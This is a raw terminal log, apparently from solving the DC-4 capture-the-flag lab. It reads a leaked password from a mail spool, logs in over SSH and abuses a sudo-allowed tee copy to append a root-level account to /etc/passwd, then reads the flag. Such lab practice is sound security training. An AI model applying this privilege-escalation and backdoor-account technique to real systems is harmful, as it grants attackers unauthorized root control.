@@ -1,0 +1,160 @@
+jim@dc-4:/var/mail$ cat jim 
+From charles@dc-4 Sat Apr 06 21:15:46 2019
+Return-path: <charles@dc-4>
+Envelope-to: jim@dc-4
+Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
+Received: from charles by dc-4 with local (Exim 4.89)
+	(envelope-from <charles@dc-4>)
+	id 1hCjIX-0000kO-Qt
+	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
+To: jim@dc-4
+Subject: Holidays
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
+From: Charles <charles@dc-4>
+Date: Sat, 06 Apr 2019 21:15:45 +1000
+Status: O
+
+Hi Jim,
+
+I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
+
+Password is:  ^xHhA&hvim0y
+
+See ya,
+Charles
+
+
+root@ap:~/CTF/DC_4# ssh charles@192.168.179.136
+charles@192.168.179.136's password: 
+Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ id
+uid=1001(charles) gid=1001(charles) groups=1001(charles)
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ sudo -l
+Matching Defaults entries for charles on dc-4:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on dc-4:
+    (root) NOPASSWD: /usr/bin/teehee
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ teehee --help
+Usage: teehee [OPTION]... [FILE]...
+Copy standard input to each FILE, and also to standard output.
+
+  -a, --append              append to the given FILEs, do not overwrite
+  -i, --ignore-interrupts   ignore interrupt signals
+  -p                        diagnose errors writing to non pipes
+      --output-error[=MODE]   set behavior on write error.  See MODE below
+      --help     display this help and exit
+      --version  output version information and exit
+
+MODE determines behavior with write errors on the outputs:
+  'warn'         diagnose errors writing to any output
+  'warn-nopipe'  diagnose errors writing to any output not a pipe
+  'exit'         exit on error writing to any output
+  'exit-nopipe'  exit on error writing to any output not a pipe
+The default MODE for the -p option is 'warn-nopipe'.
+The default operation when --output-error is not specified, is to
+exit immediately on error writing to a pipe, and diagnose errors
+writing to non pipe outputs.
+
+GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
+Full documentation at: <http://www.gnu.org/software/coreutils/tee>
+or available locally via: info '(coreutils) tee invocation'
+charles@dc-4:~$ 
+charles@dc-4:~$ sudo teehee -a /etc/passwd
+art:$1$art$JTGvPohBzi7b3iBeMsI/j/:0:0:/root/root:/bin/bash
+art:$1$art$JTGvPohBzi7b3iBeMsI/j/:0:0:/root/root:/bin/bash
+^C
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:109::/var/run/dbus:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
+charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
+Debian-exim:x:108:112::/var/spool/exim4:/bin/false
+art:$1$art$JTGvPohBzi7b3iBeMsI/j/:0:0:/root/root:/bin/bash
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ 
+charles@dc-4:~$ su art
+Password: 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+flag.txt
+# cat flag.txt	
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888 
+888   o   888          888 888      888  "Y88b                            888 888 888 888 
+888  d8b  888          888 888      888    888                            888 888 888 888 
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
+888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
+888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+# 
+
+
